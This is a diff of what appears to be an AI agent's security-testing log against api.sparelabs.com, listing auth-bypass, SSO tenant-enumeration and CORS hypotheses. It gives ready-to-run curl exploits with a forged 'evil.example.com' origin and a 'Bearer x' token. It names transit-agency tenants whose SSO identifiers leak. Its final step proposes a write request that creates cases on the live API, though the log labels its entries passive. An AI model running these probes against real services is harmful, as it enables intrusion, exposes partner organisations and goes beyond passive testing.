@@ -10284,3 +10284,34 @@ testability: PASSIVE
 [RISK] routing.sparelabs.com: 5 | envoy 404/0B on ALL probed paths since 2026-08-07; no surface, NO_DELTA
 [RISK] forms.sparelabs.com: 12 | SPA 200 + strict HTML CSP + x-frame DENY (envoy+Google CDN); JS bundle patched (main.8a2a39cb.js — zero infra leaks, 3 Maps keys referrer-restricted); SPA catch-all, no API endpoints behind host; infra leak resolved, recon-only
 [RISK] web (spare.com/sparelabs.com): 15 | spare.com HTTP 200 static Webflow (Cloudflare, CSP frame-ancestors 'self', HSTS 31536000, no internal infra leaks); sparelabs.com 301→spare.com apex; www.spare.com OOS excluded; minimal static-only surface
+## 2026-08-16 09:16:15 UTC [web] (model laguna)
+[HYP] Scheme-Only Bearer Bypass with Infra Topology Disclosure on Regions (86h stable, NOT patched)
+class: AUTH
+asset: api.sparelabs.com/v1/global/regions (GET)
+confidence: 95
+reasoning: Gate validates Bearer scheme only — token value never verified. `Bearer x` → 200 + 725B region registry (7 regions incl 6 OOS api/routing subdomains + UAT staging). Body byte-stable via sha256 fb9800acb09b65ec92591f4536e3ecfd08b8c3dba0d2ef9af3ed97047795c3fe verified this session. longcat "PATCHED" (2026-08-11) is false positive — only tested no-auth path (400), never tested Bearer-x vector. Multi-version envoy LB confirmed (fast 4ms vs slow 500ms+ replicas).
+evidence_needed: GET `Bearer x` → 200 + 725B + ACAO+ACAC; body sha256 = fb9800acb09b65ec92591f4536e3ecfd08b8c3dba0d2ef9af3ed97047795c3fe
+verify_steps: PROBE: curl -s -m15 -D -H "Origin: https://evil.example.com" -H "Authorization: Bearer x" "https://api.sparelabs.com/v1/global/regions" — verify body sha256 matches KB AND ACAO+ACAC on 200; control: curl -s -m15 -D -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/journeys" → expect 401
+impact: Unauthenticated infra topology disclosure — full 7-region deployment map incl 6 OOS api/routing subdomains + UAT staging. Unauthenticated attackers gain complete infra map for targeted follow-up. Severity HIGH.
+testability: PASSIVE
+[HYP] Unauthenticated SSO-Config Oracle via WorkOS Auth Endpoint (8 tenants, fleet-parity)
+class: IDOR
+asset: api.sparelabs.com/v1/identity/workos/auth (POST)
+confidence: 88
+reasoning: POST {"domain":"<tenant-domain>"} returns 200 + 172B with WorkOS client_id + connection_id + Entra tenant IDs for configured tenants; 404 for non-tenants. 8 confirmed tenants: spare.com, dart.org, translink.ca, mbta.com, saskatoon.ca, kingcounty.gov, winnipeg.ca, +1. Fleet-parity across 7 hosts (prod/us/us2/us3/jp/eu/uat). Universal CORS on both 200/404 branches. bart.gov probed this session → 404 (not a tenant).
+evidence_needed: POST {"domain":"dart.org"} → 200 + 172B with WorkOS client_id + connection_id + Entra tenant_id; POST {"domain":"xyz123.gov"} → 404 + ACAO+ACAC
+verify_steps: PROBE: curl -s -m15 -D -X POST -H "Origin: https://evil.example.com" -H "Content-Type: application/json" -d '{"domain":"translink.ca"}' "https://api.sparelabs.com/v1/identity/workos/auth" — confirm 200 + 172B + CORS; curl -s -m15 -D -X POST -H "Origin: https://evil.example.com" -H "Content-Type: application/json" -d '{"domain":"xyz123.gov"}' "https://api.sparelabs.com/v1/identity/workos/auth" — confirm 404 + CORS
+impact: Tenant enumeration + WorkOS client_id + connection_id + Entra tenant ID disclosure for 8 partner orgs. Enables targeted SSO phishing/CSRF with disclosed connection_ids. Severity MED.
+testability: PASSIVE
+[HYP] Zero-Header Read-Only Bypass + Full CORS Write-Preflight Chain on Organizations
+class: AUTH
+asset: api.sparelabs.com/v1/global/organizations (GET/OPTIONS)
+confidence: 90
+reasoning: GET with NO Authorization header → 200 + 11B `{"data":[]}` + ACAO:reflected + ACAC:true. OPTIONS preflight with NO Authorization → 204 + ACAO+ACAC + allow-methods:GET,HEAD,PUT,PATCH,POST,DELETE + allow-headers:Authorization. POST/PUT/PATCH/DELETE → 401 InvalidTokenError (write gate active). Bypass is read-only; auth asymmetry confirmed at handler level — validation precedes auth on engage-write paths. Control /v1/journeys stable 401.
+evidence_needed: GET no-auth → 200 + 11B + ACAO+ACAC; OPTIONS no-auth → 204 + ACAO+ACAC+write-methods; POST Bearer-x → 401
+verify_steps: PROBE: curl -s -m15 -D -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/global/organizations" — verify 200 + 11B + ACAO+ACAC; curl -s -m15 -D -X OPTIONS -H "Origin: https://evil.example.com" -H "Access-Control-Request-Method: DELETE" -H "Access-Control-Request-Headers: Authorization" "https://api.sparelabs.com/v1/global/organizations" — verify 204 + ACAO+ACAC+write-methods; curl -s -m15 -D -X POST -H "Authorization: Bearer x" "https://api.sparelabs.com/v1/global/organizations" — verify 401
+impact: Browser-based unauthenticated data extraction via CORS. Empty payload caps immediate data impact but confirms full CORS write-preflight chain (browsers allowed to attempt writes). Severity MED-HIGH.
+testability: PASSIVE
+[PARKED] None — all hypotheses pass thresholds and trace to live session probes + KB evidence.
+[FINAL]
+[NEXT] PROBE: `curl -s -m15 -D -H "Origin: https://evil.example.com" -H "Content-Type: application/json" -X POST -d '{"organizationId":"d736519f-f384-4771-a2d2-4f95e884d790","caseTypeId":"00000000-0000-0000-0000-000000000000","contactInfo":{"email":"test@evil.example.com"}}' "https://api.sparelabs.com/v1/public/engage/cases"` — confirm the engage/cases POST auth-gate-absent finding (empty POST→400 ValidationError no-auth, nil-UUID→404, spare-UUID-org→403 feature-flag gate); if 403 ForbiddenError "External case creation is not enabled" returns without 401, the auth gate is structurally absent and the handler is reached — verify whether a valid UUID + caseTypeId combination produces a different response (e.g., 400 deeper validation vs 403 feature-flag), establishing the write-path auth omission is reproducible.
